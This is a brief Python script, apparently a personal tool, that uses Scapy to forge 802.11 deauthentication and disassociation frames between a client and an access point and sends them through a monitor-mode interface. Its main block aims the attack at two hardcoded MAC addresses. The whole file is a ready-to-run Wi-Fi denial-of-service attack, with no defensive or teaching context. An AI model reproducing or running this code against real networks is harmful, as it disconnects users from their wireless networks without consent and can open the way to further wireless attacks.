from scapy.all import *
import warnings
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11

# interface_name: str = "mon0"
interface_name: str = "wlp9s0mon"

# https://issuehint.com/issue/secdev/scapy/3775


def deauth(client_mac: str,
           access_point_mac: str,
           count: int = 3,
           interface: str = interface_name):
    deauth_packet1: Any = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    deauth_packet2: Any = RadioTap() / Dot11(addr1=access_point_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()

    disas_packet1: Any = RadioTap() / Dot11(addr1=access_point_mac, addr2=client_mac, addr3=client_mac) / Dot11Disas()
    disas_packet2: Any = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Disas()

    sendp(deauth_packet1, iface=interface, count=int(count), inter=0.2)
    sendp(deauth_packet2, iface=interface, count=int(count), inter=0.2)

    sendp(disas_packet1, iface=interface, count=int(count), inter=0.2)
    sendp(disas_packet2, iface=interface, count=int(count), inter=0.2)


if __name__ == "__main__":
    deauth(client_mac="18:F0:E4:1F:B2:84", access_point_mac='E4:5F:01:61:5B:FC', count=1)
